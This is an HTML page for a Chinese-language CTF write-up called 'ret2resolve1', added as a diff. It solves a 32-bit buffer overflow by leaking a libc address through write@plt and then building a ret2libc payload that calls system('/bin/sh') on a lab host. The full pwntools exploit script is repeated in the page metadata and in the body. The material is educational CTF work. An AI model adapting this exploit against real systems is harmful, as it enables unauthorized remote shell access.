@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ret2resolve1 | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="首先查看基本情况：
+在IDA里我们可以看到main函数和产生溢出的函数：
+我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。
+那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。
+首先我们需要泄露服务器端的函数地址：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10009)elf = ELF(&#39;ret2resolve&#39;)#p = process(&#39;./ret2resolve&#39;)if args.G:gdb.attach(p)payload = 112 * b&#39;a&#39;payload &#43;= p32(elf.plt[&#39;write&#39;])payload &#43;= p32(elf.symbols[&#39;main&#39;])payload &#43;= p32(1)payload &#43;= p32(elf.got[&#39;write&#39;])payload &#43;= p32(4)payload &#43;= p32(elf.symbols[&#39;main&#39;])p.sendline(payload)write_addr = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])#write_addr = u32(p.recv(4))print(&#39;write_addr =&#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：
+可以看到，函数的后12位是460。
+然后修改一下上面的脚本，我们可以输出一些其他的函数：
+我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/
+这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：
+libcbase = write_addr - 0xd44d0system = libcbase &#43; 0x3a950binsh = libcbase &#43; 0x15912bpayload = 112 * b&#39;a&#39;payload &#43;= p32(system)payload &#43;= p32(0xdeadbeef)payload &#43;= p32(binsh)sh.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/ret2resolve1/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ret2resolve1" />
+<meta property="og:description" content="首先查看基本情况：
+在IDA里我们可以看到main函数和产生溢出的函数：
+我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。
+那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。
+首先我们需要泄露服务器端的函数地址：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10009)elf = ELF(&#39;ret2resolve&#39;)#p = process(&#39;./ret2resolve&#39;)if args.G:gdb.attach(p)payload = 112 * b&#39;a&#39;payload &#43;= p32(elf.plt[&#39;write&#39;])payload &#43;= p32(elf.symbols[&#39;main&#39;])payload &#43;= p32(1)payload &#43;= p32(elf.got[&#39;write&#39;])payload &#43;= p32(4)payload &#43;= p32(elf.symbols[&#39;main&#39;])p.sendline(payload)write_addr = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])#write_addr = u32(p.recv(4))print(&#39;write_addr =&#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：
+可以看到，函数的后12位是460。
+然后修改一下上面的脚本，我们可以输出一些其他的函数：
+我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/
+这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：
+libcbase = write_addr - 0xd44d0system = libcbase &#43; 0x3a950binsh = libcbase &#43; 0x15912bpayload = 112 * b&#39;a&#39;payload &#43;= p32(system)payload &#43;= p32(0xdeadbeef)payload &#43;= p32(binsh)sh." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/ret2resolve1/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ret2resolve1"/>
+<meta name="twitter:description" content="首先查看基本情况：
+在IDA里我们可以看到main函数和产生溢出的函数：
+我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。
+那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。
+首先我们需要泄露服务器端的函数地址：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10009)elf = ELF(&#39;ret2resolve&#39;)#p = process(&#39;./ret2resolve&#39;)if args.G:gdb.attach(p)payload = 112 * b&#39;a&#39;payload &#43;= p32(elf.plt[&#39;write&#39;])payload &#43;= p32(elf.symbols[&#39;main&#39;])payload &#43;= p32(1)payload &#43;= p32(elf.got[&#39;write&#39;])payload &#43;= p32(4)payload &#43;= p32(elf.symbols[&#39;main&#39;])p.sendline(payload)write_addr = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])#write_addr = u32(p.recv(4))print(&#39;write_addr =&#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：
+可以看到，函数的后12位是460。
+然后修改一下上面的脚本，我们可以输出一些其他的函数：
+我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/
+这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：
+libcbase = write_addr - 0xd44d0system = libcbase &#43; 0x3a950binsh = libcbase &#43; 0x15912bpayload = 112 * b&#39;a&#39;payload &#43;= p32(system)payload &#43;= p32(0xdeadbeef)payload &#43;= p32(binsh)sh."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "ret2resolve1",
+      "item": "https://jellyfish-pro.github.io/ctf/ret2resolve1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ret2resolve1",
+  "name": "ret2resolve1",
+  "description": "首先查看基本情况：\n在IDA里我们可以看到main函数和产生溢出的函数：\n我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。\n那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。\n首先我们需要泄露服务器端的函数地址：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10009)\relf = ELF(\u0026#39;ret2resolve\u0026#39;)\r#p = process(\u0026#39;./ret2resolve\u0026#39;)\rif args.G:\rgdb.attach(p)\rpayload = 112 * b\u0026#39;a\u0026#39;\rpayload += p32(elf.plt[\u0026#39;write\u0026#39;])\rpayload += p32(elf.symbols[\u0026#39;main\u0026#39;])\rpayload += p32(1)\rpayload += p32(elf.got[\u0026#39;write\u0026#39;])\rpayload += p32(4)\rpayload += p32(elf.symbols[\u0026#39;main\u0026#39;])\rp.sendline(payload)\rwrite_addr = u32(p.recvuntil(\u0026#39;\\xf7\u0026#39;)[-4:])\r#write_addr = u32(p.recv(4))\rprint(\u0026#39;write_addr =\u0026#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：\n可以看到，函数的后12位是460。\n然后修改一下上面的脚本，我们可以输出一些其他的函数：\n我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/\n这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：\nlibcbase = write_addr - 0xd44d0\rsystem = libcbase + 0x3a950\rbinsh = libcbase + 0x15912b\rpayload = 112 * b\u0026#39;a\u0026#39;\rpayload += p32(system)\rpayload += p32(0xdeadbeef)\rpayload += p32(binsh)\rsh.",
+  "keywords": [
+    
+  ],
+  "articleBody": "首先查看基本情况：\n在IDA里我们可以看到main函数和产生溢出的函数：\n我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。\n那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。\n首先我们需要泄露服务器端的函数地址：\nfrom pwn import *\rcontext.log_level = 'debug'\rp = remote('10.0.25.109',10009)\relf = ELF('ret2resolve')\r#p = process('./ret2resolve')\rif args.G:\rgdb.attach(p)\rpayload = 112 * b'a'\rpayload += p32(elf.plt['write'])\rpayload += p32(elf.symbols['main'])\rpayload += p32(1)\rpayload += p32(elf.got['write'])\rpayload += p32(4)\rpayload += p32(elf.symbols['main'])\rp.sendline(payload)\rwrite_addr = u32(p.recvuntil('\\xf7')[-4:])\r#write_addr = u32(p.recv(4))\rprint('write_addr =',hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：\n可以看到，函数的后12位是460。\n然后修改一下上面的脚本，我们可以输出一些其他的函数：\n我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/\n这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：\nlibcbase = write_addr - 0xd44d0\rsystem = libcbase + 0x3a950\rbinsh = libcbase + 0x15912b\rpayload = 112 * b'a'\rpayload += p32(system)\rpayload += p32(0xdeadbeef)\rpayload += p32(binsh)\rsh.sendline(payload)\rsh.interactive() 完整的exp：\nfrom pwn import *\rcontext.log_level = 'debug'\r#sh = process('./ret2resolve')\rsh = remote('10.0.25.109',10009)\relf = ELF('./ret2resolve')\r#libc = ELF('libc.so.6')\rpayload = 112 * b'a'\rpayload += p32(elf.plt['write'])\rpayload += p32(elf.symbols['main'])\rpayload += p32(1)\rpayload += p32(elf.got['write'])\rpayload += p32(4)\rsh.sendline(payload)\rwrite_addr = u32(sh.recvuntil('\\xf7')[-4:])\rprint(hex(write_addr))\rlibcbase = write_addr - 0xd44d0\rsystem = libcbase + 0x3a950\rbinsh = libcbase + 0x15912b\rpayload = 112 * b'a'\rpayload += p32(system)\rpayload += p32(0xdeadbeef)\rpayload += p32(binsh)\rsh.sendline(payload)\rsh.interactive() ",
+  "wordCount" : "168",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/ret2resolve1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      ret2resolve1
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>首先查看基本情况：</p>
+<p><img loading="lazy" src="/ctf/ret2resolve1.img/image-20220408111149278.png" alt="image-20220408111149278"  />
+</p>
+<p>在IDA里我们可以看到main函数和产生溢出的函数：</p>
+<p><img loading="lazy" src="/ctf/ret2resolve1.img/image-20220408111234864.png" alt="image-20220408111234864"  />
+</p>
+<p><img loading="lazy" src="/ctf/ret2resolve1.img/image-20220408111311179.png" alt="image-20220408111311179"  />
+</p>
+<p>我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。</p>
+<p>那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。</p>
+<p>首先我们需要泄露服务器端的函数地址：</p>
+<pre tabindex="0"><code>from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+p = remote(&#39;10.0.25.109&#39;,10009)
+elf = ELF(&#39;ret2resolve&#39;)
+#p = process(&#39;./ret2resolve&#39;)
+
+if args.G:
+	gdb.attach(p)
+
+payload = 112 * b&#39;a&#39;
+payload += p32(elf.plt[&#39;write&#39;])
+payload += p32(elf.symbols[&#39;main&#39;])
+payload += p32(1)
+payload += p32(elf.got[&#39;write&#39;])
+payload += p32(4)
+payload += p32(elf.symbols[&#39;main&#39;])
+
+p.sendline(payload)
+
+write_addr = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
+#write_addr = u32(p.recv(4))
+print(&#39;write_addr =&#39;,hex(write_addr))
+</code></pre><p>运行脚本后，就可以打印出write函数的地址：</p>
+<p><img loading="lazy" src="/ctf/ret2resolve1.img/image-20220411095859065.png" alt="image-20220411095859065"  />
+</p>
+<p>可以看到，函数的后12位是460。</p>
+<p>然后修改一下上面的脚本，我们可以输出一些其他的函数：</p>
+<p><img loading="lazy" src="/ctf/ret2resolve1.img/image-20220411095940319.png" alt="image-20220411095940319"  />
+</p>
+<p>我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/</p>
+<p><img loading="lazy" src="/ctf/ret2resolve1.img/image-20220411100018884.png" alt="image-20220411100018884"  />
+</p>
+<p>这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：</p>
+<pre tabindex="0"><code>libcbase = write_addr - 0xd44d0
+system = libcbase + 0x3a950
+binsh = libcbase + 0x15912b
+
+payload = 112 * b&#39;a&#39;
+payload += p32(system)
+payload += p32(0xdeadbeef)
+payload += p32(binsh)
+
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre><p>完整的exp：</p>
+<pre tabindex="0"><code>from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+#sh = process(&#39;./ret2resolve&#39;)
+sh = remote(&#39;10.0.25.109&#39;,10009)
+
+elf = ELF(&#39;./ret2resolve&#39;)
+#libc = ELF(&#39;libc.so.6&#39;)
+
+payload = 112 * b&#39;a&#39;
+payload += p32(elf.plt[&#39;write&#39;])
+payload += p32(elf.symbols[&#39;main&#39;])
+payload += p32(1)
+payload += p32(elf.got[&#39;write&#39;])
+payload += p32(4)
+
+sh.sendline(payload)
+
+write_addr = u32(sh.recvuntil(&#39;\xf7&#39;)[-4:])
+
+print(hex(write_addr))
+
+libcbase = write_addr - 0xd44d0
+system = libcbase + 0x3a950
+binsh = libcbase + 0x15912b
+
+payload = 112 * b&#39;a&#39;
+payload += p32(system)
+payload += p32(0xdeadbeef)
+payload += p32(binsh)
+
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/ret2resolve1.img/image-20220411100628988.png" alt="image-20220411100628988"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/ret2libc3_old/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ret2libc3_old</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2shellcode/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2shellcode</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
